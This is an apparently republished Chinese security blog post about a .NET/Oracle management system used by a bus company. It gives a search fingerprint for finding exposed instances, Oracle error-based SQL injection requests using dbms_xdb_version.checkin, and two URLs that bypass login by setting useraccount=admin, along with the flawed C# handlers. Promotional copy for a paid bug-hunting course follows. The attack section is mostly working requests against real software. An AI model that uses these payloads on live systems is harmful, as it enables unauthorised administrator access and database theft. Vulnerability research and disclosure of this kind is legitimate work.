#  实战复现：公交系统未授权登录 + SQL 注入漏洞利用全解  
Payload
                    Payload  神农Sec   2026-05-04 01:02  
  
    
  
  
  课程培训  
  
  扫码咨询  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXLicr9MthUBGib1nvDibDT4r6iaK4cQvn56iako5nUwJ9MGiaXFdhNMurGdFLqbD9Rs3QxGrHTAsWKmc1w/640?wx_fmt=jpeg&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=png&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
  
#   
  
专注于SRC漏洞挖掘、红蓝对抗、渗透测试、代码审计JS逆向，CNVD和EDUSRC漏洞挖掘，以及工具分享、前沿信息分享、POC、EXP分享。不定期分享各种好玩的项目及好用的工具，欢迎关注。加内部圈子，文末有彩蛋（课程培训限时优惠）。  
#   
  
文章作者：  
Payload  
  
文章来源：http://xz.aliyun.com/news/17321  
  
01  
  
0x1 实战复现：公交系统未授权登录 + SQL 注入漏洞利用全解  
  
## 1.漏洞介绍  
  
本次分析针对某系统（基于 .NET + Oracle 架构）中存在的严重安全缺陷，主要涵盖**身份认证绕过**  
与**SQL注入**  
漏洞。  
1. **登录绕过漏洞（身份伪造）**  
： 系统在多处关键接口（如后台管理入口）存在严重的逻辑缺陷。攻击者无需知晓真实密码，仅需构造特定的请求（利用 SetAuthCookie 机制或特定的参数篡改），即可直接伪造任意已存在管理员用户的身份标识（Identity）。成功利用后，攻击者可绕过登录验证界面，直接获取系统最高权限，导致整个后台管理系统完全失控。  
  
1. **SQL 注入漏洞（数据泄露与执行）**  
： 系统在多个业务模块（如培训管理、课程安排等）的参数处理上缺乏严格过滤。用户输入的 itemid 等参数被直接拼接至 Oracle 数据库查询语句中。攻击者可通过构造恶意 Payload（如利用 dbms_xdb_version.checkin 等函数进行报错注入），不仅可窃取数据库中的敏感信息（如管理员账号、哈希密码、业务数据），在特定条件下甚至可能实现数据库层面的命令执行，对服务器安全构成极大威胁。  
  
影响版本：  
> "version":"7.0.0.0.R3"  
  
  
指纹：  
```
body="HisModules/ErpAdmin/RoleMng/Js/selectDefaultRole.js"||body="var _FactoryData"

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mcko8AHj6QXicTrQIZbXBcCfyrgAqCib66wuibPU5JiczIsiafLAC5WwmAGPN6tTysJjwGic5cxxc91BhP8T3aKvgCtlY7Lia1g81QBrIgEDCwTQgY/640?wx_fmt=png&from=appmsg "")  
  
  
## 2.漏洞分析  
### 2.1注入漏洞  
#### 2.1.1第一处SQL注入漏洞  
  
**打开源码**  
YZSoftFormsXFormHRTrainOnlineArrangeCourse_Mng.aspx.cs  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mcko8AHj6QUQhUaibvZsX7Oj823n6uXTWIlq1tCZ2mpcwH0OjhSPj1U9RlmIGMDpe81RUZ5gBPSpsDREicvKGHxrIx2IVub9X1Soq8LicTrbbY/640?wx_fmt=png&from=appmsg "")  
  
漏洞分析：变量 itemid 直接来自用户输入（Request.Params["itemid"]），并且没有经过任何过滤，就直接拼接到了 SQL 查询字符串中。  
  
**复现步骤：**  
1. 发送以下 Payload 进行报错注入测试：  
  
```
POST /YZSoft/Forms/XForm/HR/TrainOnline/ArrangeCourse_Mng.aspx?relationid=1 HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded
User-Agent: 

itemid=1'

```  
  
成功获取user的值：  
  
http://127.0.0.1/YZSoft/Forms/XForm/HR/TrainOnline/ArrangeCourse_Mng.aspx?itemid=-1%27||dbms_xdb_version.checkin(user)||%27  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QWWYJKfoycjsNzXDwX9CXMSDzbvzuSmUhE6k2mPVhJL6q5DWfiaob8Vn1blBljic1aibvnG116z6lqH1BkeFkEvxw7nBOFncwBnsk/640?wx_fmt=png&from=appmsg "")  
#### 2.1.2第二处注入漏洞  
  
漏洞文件在WEBYZSoftFormsXFormBMMaintainManagementKSAddMaintainReport.aspx.cs  
  
**漏洞分析：**  
接收前端传入的 tid 和 key 参数，其中 key 参数的值被直接赋值给变量 strWorkreportno。随后，该变量未经任何过滤或参数化处理，直接通过 string.Format 拼接到 SQL 查询语句中，从而引发 SQL 注入漏洞。  
  
**复现步骤：**  
```
GET /YZSoft/Forms/XForm/BM/MaintainManagement/KS/AddMaintainReport.aspx?tid=&key=-1' HTTP/1.1
Host: 127.0.0.1

```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mcko8AHj6QUcnD8tB2HuhOJv2FMJnrHHia8MXALbHqDAHu4mlPQx4dloe6Ady5xwqI5axopAL8hQzRgeH6TJehRDHnhzhGPibQvuibG62JMI50/640?wx_fmt=png&from=appmsg "")  
  
```
GET /YZSoft/Forms/XForm/BM/MaintainManagement/KS/AddMaintainReport.aspx?tid=&key=-1%27||dbms_xdb_version.checkin(user)||%27 HTTP/1.1
Host: 

```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mcko8AHj6QVYYPw5m2IdtNlrAvk5WL7sEibcGA5xwcXUDibFYjavTlwIJSOibUIz4lCHLujiaQU7WXAIrKwlDia027YhBBQeDb7yZkaPKWt3xC84/640?wx_fmt=png&from=appmsg "")  
  
### 2.2登录绕过漏洞  
#### 2.2.1第一处登录绕过  
  
漏洞文件： WEBHisModulesOMPlanHandlerServiceArrange_Query.ashx  
```
{
    public class Arrange_Query : IHttpHandler, IRequiresSessionState
    {

        public void ProcessRequest(HttpContext context)
        {

            string action = ComFunction.GetRequestStr("action");
            string UserAccount = ComFunction.GetRequestStr("useraccount");
            if (!string.IsNullOrEmpty(UserAccount))
            {
                YZAuthHelper.SetAuthCookie(UserAccount);
                YZAuthHelper.ClearLogoutFlag();
            }
            YZAuthHelper.AshxAuthCheck();
            YZDebugHelper.Init();

            switch (action)

```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QV1AHlObP34ZJlXA1YVyXv4WTkCGicrSV0p3ibReraDt0ErkHRbsrNr3QPaJicjchiatSicRQBwFu46GsAicUq2A2QIKLGrRrnG82SFk/640?wx_fmt=png&from=appmsg "")  
  
  
漏洞分析：先通过useraccount参数设置用户身份 → 再做权限检查，相当于攻击者可以通过传入任意useraccount值，直接冒充该用户身份，完全绕过权限验证。  
```
http://127.0.0.1/HisModules/OM/Plan/HandlerService/Arrange_Query.ashx?useraccount=admin
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QUZWQsyWBQcLIp6YPiaQe0yRcINvNOm1XXurDEZAwCa8n02lb0NbibicVqR2ibxs9bUtJpSwkYy5PgBKQ2icMzsnjPNrKZ6BvcJNkQU/640?wx_fmt=png&from=appmsg "")  
  
  
在访问根路径，即可进入后台：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QXGVZ0z7zVUmXjOl7bHFIWyXvWaWH8JFdIvuicsSTGGeAC7Q6X8AFYrWKsNic7aysbuUpIAXcy8k6pKuN7qTicYrNageozxDoPb00/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mcko8AHj6QXWicr7sic8joMBhicQRT5dHUicuAe369Q9QNSiaHuERibf0CIGjshiaGV3PYiacQJib3yG5t1N1ZMmWtdib8o1Q2e6UoCuBeDgqWwUJJgUQ/640?wx_fmt=png&from=appmsg "")  
  
解释：(此处必须要系统里面存在的用户名才能登录绕过，默认伪造admin用户)  
1. 请求携带 useraccount=admin。  
  
1. 服务器执行 SetAuthCookie("admin")，当前请求身份变为 admin。  
  
1. 执行 GetPeiChePaiBanInfoList，返回的数据将是 admin 权限下的敏感数据。  
  
#### 2.2.2 第二处登录绕过漏洞  
  
打开源码 WEBWebServiceerpapi.asmx，后端逻辑指向/App_Code/ERPAPI.cs文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mcko8AHj6QVqo4JAwnySdzx6tswEc5LZuFquiaMBv8tbJju9du4JTmzK5js3ocLUF5B37D7OhVwnOn9QgWDAvYWFCRxIHkpT1OiaUaFzPP8qE/640?wx_fmt=png&from=appmsg "")  
  
打开/App_Code/ERPAPI.cs，定位到query_getworkordertypelist方法。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mcko8AHj6QXQeWulTiayZ276fnXSicJSyiaYmic6d4FFmeARMWy9ObzNBSNOXCYtr5OiaqtHM8rDFt8Zx1tNJe3BhUibibC3r1BzWLAXmbSYbfdUtE/640?wx_fmt=png&from=appmsg "")  
  
代码如下  
```
 public void query_getworkordertypelist(string paraList)
    {
        try
        {
            JObject jobject = BaseFuction.ParseParaString(paraList);
            string UserAccount = (string)jobject["UserAccount"];
            if (!string.IsNullOrEmpty(UserAccount))
            {
                YZAuthHelper.SetAuthCookie(UserAccount);
                YZAuthHelper.ClearLogoutFlag();
            }
            object[] obj = new object[1];
            obj[0] = paraList;
            string msg = GetCommand("Query_GetWorkOrderTypeList@", obj) as String;
            Context.Response.Clear();
            Context.Response.ContentType = "application/json; charset = UTF-8";
            Context.Response.Write(msg);
            Context.Response.Flush();
            Context.Response.End();
        }
        catch (Exception e)
        {
            // return BaseFuction.ParseResultString(false, "提交出错:" + e.Message, null);
        }
    }

```  
  
漏洞分析：接口接收 JSON 参数中的UserAccount字段，未做任何身份验证校验，直接调用SetAuthCookie(UserAccount)设置当前请求身份，攻击者只需传入系统中存在的用户名（如 admin），即可冒充该用户执行Query_GetWorkOrderTypeList逻辑，  
  
**复现步骤：**  
  
http://127.0.0.1/webservice/ERPAPI.asmx/query_getworkordertypelist?paraList={%22UserAccount%22:%22admin%22}  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QWJxvzsXf8yHNXhnVRLQCASMiaqlolUMcIIkOHabXmdIiaz53IkN57lvsQwwMhHGkibbicXloaTC7ID4UBfaUrBNYWozGJfibNY7AZ4/640?wx_fmt=png&from=appmsg "")  
  
  
在访问根路径，即可进入后台：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QVfXYf5FRZ7EFb8icT3jriccPUWgqEaGcRQbTIZLZeP6fRY22whFu539ia72cVstoPaRkhXxLHTNKjwBn1FFnUFK23mxsLdbnfV90/640?wx_fmt=png&from=appmsg "")  
  
02  
  
0x2 培训课程介绍  
  
26  
  
**SRC漏洞挖掘培训课程**  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/6cIuvSQkkicOHhYFkQLTibYAMUR9rfZ9eUrI78toIC4V2304G909O6s6CnVrAGiaYLEJM9XuUARhzNfxCtYKQfQ83wfPSlqpshSScfoYzSKzgY/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&watermark=1&tp=wxpic#imgIndex=4 "")  
  
  
**1.课程价格目前是475（后面也会随着人数越多，涨价）🌟师傅们还可以上车补票，冲冲冲！**  
  
**2.报名成功送知识星球一个，拉内部小圈子交流群+SRC直播通知群！✨**  
  
**3.一周2节课程，直播+录播形式，课程内容大家可以看课表，目前是第一期，一次报名永久无限听课！❤️**  
  
**4.目前是第一期课程，后面比如说开了二、三期，都是不用在花钱的！**  
  
**5.上课结束后，会把视频录播+课件笔记一起打包发直播群！**  
  
**6.哔哩哔哩SRC课程公开课，链接🔗直达：**  
  
**https://space.bilibili.com/642258933**  
  
SRC课程详情🔎：[神农SRC 漏洞挖掘实战课：从 0 到 1 成](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247505805&idx=1&sn=d3bb65bef6d6021bb923516b585abc06&scene=21#wechat_redirect)  
  
[‍](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247505805&idx=1&sn=d3bb65bef6d6021bb923516b585abc06&scene=21#wechat_redirect)  
  
[为赏金猎人](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247505805&idx=1&sn=d3bb65bef6d6021bb923516b585abc06&scene=21#wechat_redirect)  
  
  
内部小圈子知识星球详情🔎：[强烈推荐一个永久的SRC挖掘、渗透攻防内部知识库](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247504561&idx=1&sn=c2cd5f397b84ab059dd36e19fe31d428&scene=21#wechat_redirect)  
  
  
欢迎关注微信公众号：神农Sec，报名咨询添加微信：  
routing_love  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/mcko8AHj6QVcCkxIUpaBmNic17zibGfXMWrr9z89gE0DFtbOu3QYzD5d62zsp6qwc38Pssk60mLq8VKthcMOmctVlHU716S5G4KYmrKVrEj5c/640?wx_fmt=other&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=6 "")  
  
开课三个月时间左右  
，课程目前已经  
累计加入了664个学员  
了，课程培训招生任火热持续中，师傅们  
对于我们课程感兴趣的，想要学习技术，找工作的可以咨询我报名  
。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QVmdLBDlbl5p4Teyw5qqFOIFTIUxIxRay83I5qDXG690XI61gRj8MXTvTaibC4q2cCb1CbM4XS2FK6X4KYhPTX2ibgvA363YYwcE/640?wx_fmt=png&from=appmsg "")  
  
课程培训记录📝，每次上车在1-3小时之间，上课包括课程内部群大家  
交流氛围很好！  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/mcko8AHj6QVITh8VvNrnXLk1uuBSYeYtdOxg96gnicdvmpa2GhwOVTvBGzKEA5ktu7C7wqFYWWRuYZgKmsI8TAoYFia1uC8iaiaLvUNXS7JMMqU/640?wx_fmt=other&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=18 "")  
  
课程上课笔记课件📒都会打包给师傅们，笔记都非常详细，很多几k价格的培训机构哪怕是课件笔记都没有的，我这里都是下课第一时间把  
录播+笔记打包发给大家！  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QWbRV4mBn8GZHrvHocPMYYcBuAM3gyIKOM0SicBWQhywMehkXInvEerRLySOPPMzEmM2GLSlOMFREx6QItqtCgCibGs2MeY6yvu0/640?wx_fmt=png&from=appmsg "")  
  
平常也都会给学员进行一些项目发布，包括后面的  
工作、护网内推等，经常上麦交流，大家互相学习，简历优化等。  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QXvjjkgJibDEUhdDjErjibiangGsN0rqb0Av59xfyxBbDrTMNdfIAhNXlx0HQKvxIVBIEGAAbYrEENzd77j65asejlD4a50Sb4U7o/640?wx_fmt=other&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=20 "")  
  
SRC漏洞挖掘课程培训已经两个星期了，期间也是创建了  
“回本小群”，希望学员回本越来越多，创建这个群主要是鼓励学员学习进步，以及不定时发小项目！  
  
最后也是希望大家都可以赚钱，找到好工作🎉  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QXjNTkicoQrhumSEFFKUMKNRsTQ4DnUvRfAHK7raa7Ug1CF0qU32wApV3oq4G8Y8jFq7micOtvuNBrXEicEBF8A6AOc4KibUYfiaDuA/640?wx_fmt=png&from=appmsg "")  
  
培训时间不长，感谢🙏师傅们的  
喜报  
，很开心看到师傅们给我分享自己的成果，  
希望师傅们越来越强！  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QUMAtEWv3xXZPDsGBRhESmwGRciaasCGibU8TtbP2U0YVZPBdf5tlLqpWAtQKBh5oFwgETyvicKBeW1JSsekAyJ5cbRlSdjooQkSM/640?wx_fmt=other&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=22 "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QUrS4N68nZ0EyE76Wkib7ZDrpnZWw2Q1RJQvFEdIOu5XvFGCwpz9lziabKyo9C9d5ZiamibuSXlibhXLHb7b8QJhqEIs3hXvqktkkyA/640?wx_fmt=png&from=appmsg "")  
  
  
平常也会分享项目，下面是一些  
学员项目成果  
，群里报课的学员都是不抽成的，主要是帮助学员进行  
回本  
，  
让大家都可以进步！  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QWS8lR4pmzZrczwr6YjtG48EqF9q4FlAUH78M7DXkiboqF8Q1HkeWJLzpFPOQBToO3auj8r4rU9x3fuafXUDVMEcFj5EI6U3P9w/640?wx_fmt=other&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=23 "")  
  
上课结束后，会把  
视频录播+课件笔记  
一起打包发直播群  
  
**「神农安全」**  
知识星球目前已经  
累计2000+网络安全爱好者的加入！  
  
后面也是小圈子做大起来了，师傅们也都喜欢看我文章，想着给大家教下src漏洞挖掘思路，所以自己花了很长时间做了✨  
课件和课表，都是纯自己手搓的，大家也可以看下课表的内容。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXNmpV89Zxcm1J56eeHltthM2sjuWQFbmvWv79V058KwI0DswFF9LysewGtULj81Vp5bX9nTEK78A/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mcko8AHj6QVhliaOc71FnQLZjEUB2QiavqaRdiaaAN25Gb1HNADIy0cYvIIHC46za7Ab6sibRKvKG2tbJBxqrOGyczqWF44LQOKllnZXE6PU5iaE/640?wx_fmt=png&from=appmsg "")  
  
03  
  
0x3 课程特色  
  
课程  
主打真实，  
一线SRC漏洞挖掘师傅是如何学习和挖掘SRC漏洞的，让你真正了解SRC漏洞挖掘，助力在岗人员和大学生的能力提升，掌握新的技能树，为下一次  
跳槽涨薪做好准备。本  
课程内容覆盖企业  
SRC、众测项目挖掘、护网HVV红蓝攻防技巧、CVE、CNVD、EDUSRC等平台通杀案例技巧挖掘方法。  
  
本课程  
适合人群  
（光看不挖啥也不会）  
```
1、想从0转行入行的大学生或自学者
2、想从CTF比赛/Web或SRC进阶到项目实战的选手
3、想参与项目/找工作/提高收入的转型者
```  
  
课程价格：475元  
  
报课成功的师傅们直接免费送内部小圈：一个知识星球+内部小圈子交流群  
```
1、课程价格真心实惠，绝不割韭菜
2、两三百的课程价格让你体会大几千的培训课程内容
3、带着大家从0到1，本人上课坚持手搓课件（实战案例+知识体系）
4、拒绝使用PPT演讲模式（无实操，很枯燥）
```  
  
直播培训教学方式  
  
课程  
一周1-2节课，课程特色涵盖直播多人上麦活跃回答，直播过程中有问题随时解决或私信我。  
拉微信群：一个知识星球内部小圈子交流群+课程培训直播通知群。有项目/工作/护网第一时间内推报课的师傅，  
一对一简历优化，助力在岗人员和大学生的能力提升。  
  
一次报名每期均可永久学习，并且赠送内部「神农安全」知识星球，一对一永久解答、无保留教学！  
  
欢迎关注微信公众号：神农Sec，报名咨询添加微信：  
routing_love  
  
课程均为线上交付，报名成功后  
不支持退款  
  
内部小圈子  
（知识星球+内部小圈子交流群+知识库）  
  
对内部小圈子感兴趣的师傅们也可以看下下面的这个  
跳转链接，里面有对小圈子的详细介绍，报名课程成功的师傅们直接免费送一个（直接点击下面直接可以跳转）。  
  
[强烈推荐一个永久的SRC挖掘、渗透攻防内部知](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247501608&idx=1&sn=5eb836122ac222ca9767a7bbc3c4521b&scene=21#wechat_redirect)  
  
[‍](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247501608&idx=1&sn=5eb836122ac222ca9767a7bbc3c4521b&scene=21#wechat_redirect)  
  
[识库](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247501608&idx=1&sn=5eb836122ac222ca9767a7bbc3c4521b&scene=21#wechat_redirect)  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mcko8AHj6QWJWY80EtNrV3ajfqcPQ1h5Y2RR2Do6B7XQLEwOYedBHGA9jPVJfmImxrw2ZGRM8xvAjRyyuH6pb6tyrYib0yd7u79uWbPFC0X8/640?wx_fmt=png&from=appmsg "")  
  
讲师介绍  
  
id：一个想当文人的黑客  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXNmpV89Zxcm1J56eeHltthqvGuVSjkR43eeaNibf1KbGU4nia5ibXFYpTBFeAbQewTq43IqJHIMhhhg/640?wx_fmt=png&from=appmsg "")  
  
欢迎关注微信公众号：神农Sec，报名咨询添加微信：  
routing_love  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXLicr9MthUBGib1nvDibDT4r6iaK4cQvn56iako5nUwJ9MGiaXFdhNMurGdFLqbD9Rs3QxGrHTAsWKmc1w/640?wx_fmt=jpeg&from=appmsg "")  
  
04  
  
0x4 第一期挖洞培训课表内容  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVMibw6HiaoHUxJgNHUVfqCicbGSauW0QQBjLcC9H4gdOEyW3ZzLjTfyYibqGdaSueO9GDbbyicmckia2Kg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/MVPvEL7Qg0F0PmZricIVE4aZnhtO9Ap086iau0Y0jfCXicYKq3CCX9qSib3Xlb2CWzYLOn4icaWruKmYMvqSgk1I0Aw/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
**内部圈子介绍（报课赠送）**  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/MVPvEL7Qg0F0PmZricIVE4aZnhtO9Ap08Z60FsVfKEBeQVmcSg1YS1uop1o9V1uibicy1tXCD6tMvzTjeGt34qr3g/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
  
**圈子专注于更新src/红蓝攻防相关：**  
  
```
1、维护更新src专项漏洞知识库，包含原理、挖掘技巧、实战案例
2、知识星球专属微信“小圈子交流群”
3、微信小群一起挖洞
4、内部团队专属EDUSRC证书站漏洞报告
5、分享src优质视频课程（企业src/EDUSRC/红蓝队攻防）
6、分享src挖掘技巧tips
7、不定期有众测、渗透测试项目（一起挣钱）
8、不定期有工作招聘内推（工作/护网内推）
9、送全国职业技能大赛环境+WP解析（比赛拿奖）
10、十个专栏会持续更新~提前续费有优惠，好用不贵很实惠
11、每日内部资料分享，内部圈子资料1000+
12、联系圈主获取：内部漏洞知识库+圈子使用手册+内部圈子交流群
13、VX：routing_love，技术交流+疑问解决
```  
  
  
**内部圈子**  
**专栏介绍**  
  
知识星球内部共享资料截屏详情如下  
  
（只要没有特殊情况，每天都保持更新）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYcoLuuFqXztiaw8CzfxpMibgpeLSDuggy2U7TJWF3h7Af8JibBG0jA5fIyaYNUa2ODeG1r5DoOibAXA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFxYMxoc1ViciafayxiaK0Z26g1kfbVDybCO8R88lqYQvOiaFgQ8fjOJEjxA/640?wx_fmt=png&from=appmsg "")  
  
  
05  
  
0x5   
优秀学员报喜  
  
下面是最近两个月培训期间，很多  
优秀学员进行报喜，看到师傅们有收获，也是感到很开心的！  
拉回本小群，就是为了促进大家学习，在群里发学员成果，也是为了让大家学习优秀的师傅们。  
  
加油，你我皆是黑马！  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QWS8lR4pmzZrczwr6YjtG48EqF9q4FlAUH78M7DXkiboqF8Q1HkeWJLzpFPOQBToO3auj8r4rU9x3fuafXUDVMEcFj5EI6U3P9w/640?wx_fmt=other&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=23 "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mcko8AHj6QWK7cWZiaiatmAfXNWyj732Fib2ntZRWjFR4rfftXb2LoeicNAMZPrbBJFR2Ybf9XmWpqOiammYbiaxoQN5q5XRXo5xPicld4PhTtPtCI/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mcko8AHj6QU6ibZutPq43zUiap7IgDmJq7kwUKJBCa2IDujYiadMJfe9fFH9DOfUEOM2TibibYRuFiahDqMnBX1MVjLw5XIdNDSuR5P3g7XibaUkBo/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mcko8AHj6QVz2wFpVfer0uAFVpLKyicMaaLkmJDdg5bWnOotuzN3S9r2FMKpEKrJy8ND7icWVzNgqyYS2J6XElVN43vGca4X6HcEqapwGcNX0/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QWLzyCczAqyEgBN7ibpfzJQonkfJ9PeHWlbbz7pBG5xmiauw81a4dS7EkcoG33YvUTiawb2hnOrfCViaAs0kN15Qv88b8xbCB82JrQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mcko8AHj6QWMRBibibHU4BHONYicLia0Vfhbct2fKKgT65xgHerRoicLk7CnYkasjgmQ1A5EicRWatPibJQO2GyGFk1pPsjibMWkdicOIvHnqiasHzj3o/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mcko8AHj6QVRqR4bI22pibTSVQVSibImicNHOCUGQAaUlo9lZsNJicLmcTaQKl662ulqoX54EmbCDKUD3ibibdZxqKaOJAcoyIV7cAn7tKqia8S470/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QXB1O6Fx3ia62NNWITh9vUQaEKp7epibLWeEsdobibvBvqNDoTCAvfyQFHw597O24naJAIpM4QALgfqMWWc4E1KHrxBoaGRxE4Ajc/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mcko8AHj6QXnjwIRWjJOVSuN4X4HjmEFtCVqCHZ05M77sXqzmVjibaJbLUw3ApOuz7iaH8OCCnRmTRYVtKC5NajGKVkI4pnKZsJaj0T4iaYibq0/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/mmbiz_png/mcko8AHj6QUm9nL5FsCxBKWrhMmwpgVvr7x7IfEu2IQPQuXMiaJZSHDyNDib5qoA3tGvfW8TUfShOKvIDuia32oSqb9YN1ghaxaKAicW6uKxrvU/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mcko8AHj6QWRdtEUY2aeAZh34wDle515j7UwnibFQeCibWSeDKGnIZ2YH5VGX64cYeXgPGdCwHLKdsMY07EIVliapxh10gzQ2EO3bks7bxhmVs/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QW7rozFqSBVNRDE2kbfUSB4FefOPm9LXM2B9bV4n9VPM7Kt11rfw284Ejn4AHUc1Uc1r1gZs3FF6umgPk1QejcC6zrOAYEyegY/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QV0epFsicbJrNPgGwNXcXRCDrC1sGQySI2ylkfs2Hdic6d6unjwqNiby5DfhtfT6ezabX13bNeR53pOW3BUqLaZrIvPM8Z4IsBpgI/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mcko8AHj6QXwfrgic5XLseOxkPOWkjm1yicAW2ZiaAqzxtbjPok4Yhic2Wiblic93SSGN5BtT77AFuZt6ySuRL09icqIicPuOUUbL5NbWgMCHgLictiak/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QW2swH16lFEBhjaxgV6SficichviaOVV2ZRabZdoxIeNCxfKub4EPH0TiaTvQqhZRk9jOmVlWsdFlZibIwJLlLIZWoSm7wq1ibU2icbw0/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QWpzNI7sn0dCdaebEyMXY3Gx9tkNjicAiaEctakpWVtl4evP95MOl9ErgT9NYQiaF6dCt0FGFPziaVxz9QuE5SsiagkJYNicRR18lVb0/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mcko8AHj6QWzKmnCemQquDBf5uFwcpaG7RQqSPVwKqOKjrFxkCicFVTh6ngv3LOGDY1InR2mj0D6iby2A3Adic9U6MMsJ8FIo2wwxzPswjHsIQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mcko8AHj6QXQJcAmd5OVIoq1znICoW1Sy9hTsxpwe9HsiceptQ58rFYCNibBonWQQEH1TB3IrMASTQ3icWHwRd7JDtBwAwibWEGZxvIxeseTiaIY/640?wx_fmt=png&from=appmsg "")  
  
  
  
**神农安全公开交流群**  
  
有需要的师傅们直接扫描文章二维码加入，然后要是后面群聊二维码扫描加入不了的师傅们，直接扫描文章开头的二维码加我（备注加群）  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/mcko8AHj6QVv5O1KianrGD41diaHmGn94jOCZmnBCXGib2huE6sPia1brDMUX8Qc9ficEky5bau9mBwXAYes6ydXJ4SeeuJVUGvnWr3foIicIhlEc/640?wx_fmt=jpeg&from=appmsg "")  
  
